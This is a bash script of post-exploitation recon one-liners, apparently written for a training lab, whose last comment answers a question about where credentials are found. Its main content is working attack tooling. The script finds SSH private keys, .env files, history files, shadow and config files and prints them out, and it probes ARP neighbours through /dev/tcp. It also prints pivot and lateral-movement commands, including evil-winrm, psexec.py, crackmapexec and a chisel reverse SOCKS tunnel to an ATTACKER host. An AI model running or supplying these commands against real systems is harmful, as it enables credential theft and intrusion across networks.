#!/bin/bash
# ╔═══════════════════════════════════════════════════════════════════════════╗
# ║         ULTIMATE SYSTEM ENUMERATION + AUTO NEXT-STEPS GENERATOR           ║
# ║                    Living Off The Land - Full Recon                        ║
# ╚═══════════════════════════════════════════════════════════════════════════╝

# ═══════════════════════════════════════════════════════════════════════════════
# THE MEGA ONE-LINER (Copy this entire block)
# ═══════════════════════════════════════════════════════════════════════════════

echo "╔═══════════════════════════════════════════════════════════════╗";echo "║            SYSTEM ENUMERATION + NEXT STEPS                    ║";echo "╚═══════════════════════════════════════════════════════════════╝";echo;echo "=== SYSTEM INFO ===";hostname;id;uname -a;cat /etc/os-release 2>/dev/null|head -3;echo;echo "=== NETWORK CONFIG ===";ip -4 a|grep inet|grep -v 127;echo;echo "=== DUAL-HOMED CHECK ===";[ $(ip -4 a|grep "inet "|grep -v 127|wc -l) -gt 1 ]&&echo "[!] PIVOT POINT - DUAL HOMED!"||echo "Single interface";echo;echo "=== USERS WITH SHELL ===";grep -E "sh$|bash$" /etc/passwd;echo;echo "=== SUDO RIGHTS ===";sudo -l 2>/dev/null;echo;echo "=== SSH KEYS ===";find /home /root /tmp /var /opt -name "id_*" -o -name "*.pem" -o -name "authorized_keys" 2>/dev/null|while read f;do echo "[KEY] $f";done;echo;echo "=== CREDENTIALS IN FILES ===";find /home /root /var/www /opt /etc -type f \( -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" -o -name "*pass*" -o -name "*cred*" -o -name "*.txt" -o -name "*.xml" -o -name "*.json" -o -name "*.yml" -o -name "*.yaml" -o -name ".htpasswd" -o -name "wp-config.php" -o -name "config.php" -o -name "database.php" -o -name "settings.php" \) 2>/dev/null|head -50|while read f;do grep -l -iE "pass|pwd|secret|key|token|cred|auth|api" "$f" 2>/dev/null&&echo "[CRED?] $f";done;echo;echo "=== HISTORY FILES ===";find /home /root -name ".*history" -exec echo "[HIST] {}" \; -exec grep -iE "ssh|pass|mysql|sudo|curl|wget|ftp|scp|rsync|token|key|secret" {} \; 2>/dev/null;echo;echo "=== DATABASE CONFIGS ===";find / -name "*.sql" -o -name "my.cnf" -o -name "pg_hba.conf" -o -name "mongod.conf" 2>/dev/null|head -10;echo;echo "=== WEB CONFIGS ===";find /var/www /srv/www /opt -name "*.php" -exec grep -l -iE "mysql_connect|mysqli|PDO|password|db_pass" {} \; 2>/dev/null|head -10;echo;echo "=== SUID BINARIES ===";find / -perm -4000 -type f 2>/dev/null|head -15;echo;echo "=== WRITABLE DIRS ===";find / -writable -type d 2>/dev/null|grep -vE "^/proc|^/sys|^/dev"|head -10;echo;echo "=== CRON JOBS ===";ls -la /etc/cron* 2>/dev/null;cat /etc/crontab 2>/dev/null;echo;echo "=== ACTIVE CONNECTIONS ===";ss -tunp 2>/dev/null|grep -E "ESTAB|LISTEN"|head -15;echo;echo "=== ARP/NEIGHBORS ===";ip neigh;echo;echo "=== MOUNTED SHARES ===";mount|grep -iE "cifs|nfs|smb";df -h|grep -vE "tmpfs|udev";echo;echo "╔═══════════════════════════════════════════════════════════════╗";echo "║                    DISCOVERED LOOT                            ║";echo "╚═══════════════════════════════════════════════════════════════╝";for k in $(find /home /root -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null);do echo;echo "[SSH KEY FOUND] $k";echo "--- Content ---";cat "$k";done;echo;echo "╔═══════════════════════════════════════════════════════════════╗";echo "║              AUTO-GENERATED NEXT STEPS                        ║";echo "╚═══════════════════════════════════════════════════════════════╝";echo;for h in $(ip neigh|grep -v FAIL|awk '{print $1}'|sort -u);do echo "# Pivot to $h:";for p in 22 445 5985 3389;do echo "  # Port $p:";case $p in 22)echo "    ssh -i /home/webadmin/id_rsa user@$h";;445)echo "    smbclient -L //$h/ -U user%pass";;5985)echo "    evil-winrm -i $h -u user -p pass";;3389)echo "    xfreerdp /v:$h /u:user /p:pass";;esac;done;done


# ═══════════════════════════════════════════════════════════════════════════════
# COMPACT VERSION (Still comprehensive)
# ═══════════════════════════════════════════════════════════════════════════════

echo "=SYS=";id;hostname;uname -a;echo "=NET=";ip -4 a|grep inet;ip neigh;echo "=USERS=";grep sh$ /etc/passwd;echo "=KEYS=";find /home /root -name "id_*" -exec cat {} \; 2>/dev/null;echo "=CREDS=";grep -rliE "pass|secret|key|token" /home /var/www /opt /etc 2>/dev/null|head -20;echo "=HIST=";cat /home/*/.bash_history /root/.bash_history 2>/dev/null|grep -iE "ssh|pass|mysql|sudo";echo "=SUID=";find / -perm -4000 2>/dev/null|head -10;echo "=SUDO=";sudo -l 2>/dev/null


# ═══════════════════════════════════════════════════════════════════════════════
# ECHO + CHMOD + RUN VERSION (For sh shells)
# ═══════════════════════════════════════════════════════════════════════════════

echo '#!/bin/bash
R="\033[31m";G="\033[32m";Y="\033[33m";B="\033[34m";N="\033[0m"
p(){ echo -e "${G}[+]${N} $1"; }
w(){ echo -e "${Y}[!]${N} $1"; }
e(){ echo -e "${R}[-]${N} $1"; }
h(){ echo -e "\n${B}=== $1 ===${N}"; }

h "SYSTEM INFO"
echo "Hostname: $(hostname)"
echo "User: $(id)"
echo "Kernel: $(uname -a)"
cat /etc/os-release 2>/dev/null|grep -E "^NAME|^VERSION"|head -2

h "NETWORK INTERFACES"
ip -4 addr 2>/dev/null|grep "inet "|grep -v 127|awk "{print \"  \"\$NF\": \"\$2}"
IFACES=$(ip -4 a|grep "inet "|grep -v 127|wc -l)
[ $IFACES -gt 1 ] && w "DUAL-HOMED HOST - PIVOT POINT!" || echo "  Single interface"

h "ROUTING & NEIGHBORS"
ip route|head -5
echo "ARP:"
ip neigh|grep -v FAIL

h "USERS WITH LOGIN SHELL"
grep -E "/bin/(ba)?sh$" /etc/passwd|while read l;do
  u=$(echo $l|cut -d: -f1)
  h=$(echo $l|cut -d: -f6)
  echo "  $u -> $h"
done

h "SSH KEYS"
for d in /home/* /root /tmp /var /opt;do
  find "$d" -name "id_*" -o -name "*.pem" -o -name "authorized_keys" 2>/dev/null|while read f;do
    p "Found: $f"
    [ -r "$f" ] && echo "--- CONTENT ---" && cat "$f" && echo "---------------"
  done
done

h "CREDENTIAL FILES"
find /home /root /var/www /opt /etc /srv 2>/dev/null -type f \( \
  -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" -o \
  -name "*pass*" -o -name "*cred*" -o -name "*secret*" -o \
  -name ".htpasswd" -o -name "wp-config.php" -o -name "config.php" -o \
  -name "database.php" -o -name "settings.php" -o -name "db.php" -o \
  -name "*.json" -o -name "*.yml" -o -name "*.yaml" -o -name "*.xml" \
\)|while read f;do
  grep -qliE "password|passwd|pwd|secret|api.?key|token|credential|auth" "$f" 2>/dev/null && p "Creds in: $f"
done

h "HISTORY FILES"
for hf in /home/*/.bash_history /home/*/.zsh_history /root/.bash_history /root/.zsh_history;do
  [ -f "$hf" ] && echo "[$hf]:" && grep -iE "ssh|pass|mysql|sudo|curl.*-u|wget.*pass|token|secret|key" "$hf" 2>/dev/null|tail -10
done

h "DATABASE CONFIGS"
find /etc /var /opt /home -name "my.cnf" -o -name ".my.cnf" -o -name "pg_hba.conf" -o -name "mongod.conf" 2>/dev/null|while read f;do
  p "$f"; grep -iE "password|pass" "$f" 2>/dev/null
done

h "WEB APPLICATION CONFIGS"
find /var/www /srv/www /opt -type f -name "*.php" 2>/dev/null|xargs grep -l -iE "mysql_connect|mysqli|db_pass|password" 2>/dev/null|head -10|while read f;do
  p "$f"
  grep -iE "\$db|\$pass|\$pwd|password|mysqli" "$f" 2>/dev/null|head -5
done

h "ENV FILES"
find /home /var/www /opt /srv -name ".env" -o -name ".env.*" 2>/dev/null|while read f;do
  p "$f"; cat "$f" 2>/dev/null
done

h "SUDO RIGHTS"
sudo -l 2>/dev/null || echo "  Cannot check sudo"

h "SUID BINARIES"
find / -perm -4000 -type f 2>/dev/null|grep -vE "^/snap"|head -15

h "CAPABILITIES"
getcap -r / 2>/dev/null|head -10

h "WRITABLE SENSITIVE LOCATIONS"
for d in /etc /opt /var/www;do
  find "$d" -writable -type f 2>/dev/null|head -5
done

h "CRON JOBS"
cat /etc/crontab 2>/dev/null|grep -v "^#"|grep .
ls -la /etc/cron.d/ 2>/dev/null
for u in $(cut -d: -f1 /etc/passwd);do crontab -l -u "$u" 2>/dev/null|grep -v "^#"|grep . && echo "  ^-- $u";done

h "RUNNING PROCESSES (interesting)"
ps aux 2>/dev/null|grep -iE "mysql|postgres|apache|nginx|docker|kube|vault|ansible"|grep -v grep

h "DOCKER"
docker ps 2>/dev/null && w "Docker available!"
ls -la /var/run/docker.sock 2>/dev/null

h "INTERNAL SERVICES"
ss -tunlp 2>/dev/null|grep LISTEN

h "ACTIVE CONNECTIONS"
ss -tunp 2>/dev/null|grep ESTAB|head -10

h "MOUNTED SHARES"
mount|grep -iE "cifs|nfs|smb|fuse"
cat /etc/fstab 2>/dev/null|grep -iE "cifs|nfs|smb"

h "INTERESTING FILES IN /tmp /var/tmp /dev/shm"
find /tmp /var/tmp /dev/shm -type f -size +0 2>/dev/null|head -10

echo -e "\n${B}╔═══════════════════════════════════════════════════════════════╗${N}"
echo -e "${B}║              AUTO-GENERATED NEXT STEPS                        ║${N}"
echo -e "${B}╚═══════════════════════════════════════════════════════════════╝${N}"

# Find SSH keys and generate commands
KEYS=$(find /home /root -name "id_rsa" -o -name "id_ed25519" 2>/dev/null|head -1)
USERS=$(grep -E "sh$" /etc/passwd|cut -d: -f1|tr "\n" " ")

echo -e "\n${Y}[DISCOVERED PIVOT TARGETS]${N}"
for target in $(ip neigh 2>/dev/null|grep -v FAIL|awk "{print \$1}"|sort -u);do
  echo -e "\n${G}Target: $target${N}"
  
  # Check what ports we found
  for p in 22 445 3389 5985 80 443;do
    (echo >/dev/tcp/$target/$p) 2>/dev/null && {
      echo "  Port $p OPEN:"
      case $p in
        22)
          [ -n "$KEYS" ] && echo "    ssh -i $KEYS root@$target"
          [ -n "$KEYS" ] && echo "    ssh -i $KEYS administrator@$target"
          for u in $USERS;do echo "    ssh -i $KEYS $u@$target";done
          echo "    # SSH Tunnel: ssh -D 9050 -i $KEYS user@$target"
          echo "    # Port Forward: ssh -L 8080:127.0.0.1:80 -i $KEYS user@$target"
          ;;
        445)
          echo "    smbclient -L //$target/ -U administrator%password"
          echo "    crackmapexec smb $target -u users.txt -p passwords.txt"
          echo "    psexec.py domain/user:pass@$target"
          ;;
        3389)
          echo "    xfreerdp /v:$target /u:administrator /p:password"
          echo "    rdesktop $target"
          ;;
        5985)
          echo "    evil-winrm -i $target -u administrator -p password"
          echo "    evil-winrm -i $target -u administrator -H ntlm_hash"
          ;;
        80|443)
          echo "    curl -s http://$target/"
          echo "    gobuster dir -u http://$target/ -w /usr/share/wordlists/dirb/common.txt"
          ;;
      esac
    }
  done
done

echo -e "\n${Y}[TUNNELING COMMANDS]${N}"
echo "# SOCKS Proxy via SSH:"
echo "  ssh -D 9050 -f -N -i $KEYS user@pivot_host"
echo "  proxychains nmap -sT target"
echo ""
echo "# Chisel (if available):"
echo "  # Attacker: chisel server -p 8080 --reverse"
echo "  # Victim:   chisel client ATTACKER:8080 R:socks"
echo ""
echo "# SSH Local Port Forward:"
echo "  ssh -L 445:172.16.5.35:445 -i $KEYS user@pivot"
echo "  smbclient -L //127.0.0.1/ -U user"
' > /tmp/enum.sh && chmod +x /tmp/enum.sh && bash /tmp/enum.sh


# ═══════════════════════════════════════════════════════════════════════════════
# ULTRA-COMPACT CRED HUNTER (Just finds creds fast)
# ═══════════════════════════════════════════════════════════════════════════════

find /home /root /var/www /opt /etc /srv /tmp 2>/dev/null -type f \( -name "id_*" -o -name "*.pem" -o -name ".env*" -o -name "*pass*" -o -name "*cred*" -o -name "*.conf" -o -name "*.cfg" -o -name "wp-config.php" -o -name "config.php" -o -name ".htpasswd" -o -name "*.json" -o -name "shadow" -o -name "*.key" \) -exec sh -c 'echo "=== {} ===" && cat "{}" 2>/dev/null|head -30' \; 2>/dev/null


# ═══════════════════════════════════════════════════════════════════════════════
# ANSWER TO THE QUESTION:
# "In what user's directory can you find the credentials?"
# ═══════════════════════════════════════════════════════════════════════════════

# Based on the scan output: /home/webadmin/id_rsa
# ANSWER: webadmin
